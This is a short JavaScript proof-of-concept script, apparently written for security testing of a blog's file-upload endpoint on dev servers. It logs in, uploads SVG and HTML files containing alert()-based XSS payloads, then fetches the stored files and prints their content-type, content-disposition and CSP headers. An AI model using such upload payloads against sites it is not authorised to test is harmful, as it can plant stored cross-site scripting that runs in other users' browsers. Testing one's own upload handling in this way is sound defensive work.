// 上传危险文件 PoC:注册用户经 /api/upload 代理上传 SVG/HTML,检查存储服务响应头
import { Torchwood } from '@torchwood/sdk'

const GATEWAY = 'https://torchwood-dev.deeploop.run'
const SITE = 'https://torchwood-blog-dev.deeploop.run'
const email = process.argv[2]
const password = process.argv[3]

const tw = Torchwood.create({ endpoint: GATEWAY, projectId: 'blog' })
const r = await tw.account.signIn({ email, password })
const token = r.tokens.access_token
console.log('[login] ok')

async function upload(name, type, content) {
  const form = new FormData()
  form.append('file', new File([content], name, { type }))
  const res = await fetch(`${SITE}/api/upload`, {
    method: 'POST',
    headers: { authorization: `Bearer ${token}` },
    body: form,
  })
  const json = await res.json().catch(() => null)
  console.log(`\n[upload] ${name} -> HTTP ${res.status}`)
  console.log(JSON.stringify(json)?.slice(0, 500))
  return json
}

const svg = upload('sec-test.svg', 'image/svg+xml', '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><script>alert(1)</script><text x="10" y="20">SEC TEST</text></svg>')
const html = upload('sec-test.html', 'text/html', '<!doctype html><html><body><h1>SEC TEST</h1><script>alert(document.domain)</script></body></html>')
const txt = upload('sec-test.txt', 'text/plain', 'sec test plain')

for (const p of [await svg, await html, await txt]) {
  if (!p?.file) continue
  for (const key of ['viewUrl', 'previewUrl', 'downloadUrl']) {
    const url = p.file[key]
    if (!url) continue
    const res = await fetch(url)
    const body = await res.text()
    console.log(`\n[fetch ${key}] ${url}`)
    console.log('  status:', res.status)
    for (const h of ['content-type', 'content-disposition', 'x-content-type-options', 'content-security-policy', 'content-length']) {
      if (res.headers.get(h)) console.log(`  ${h}:`, res.headers.get(h))
    }
    console.log('  body head:', JSON.stringify(body.slice(0, 90)))
  }
}
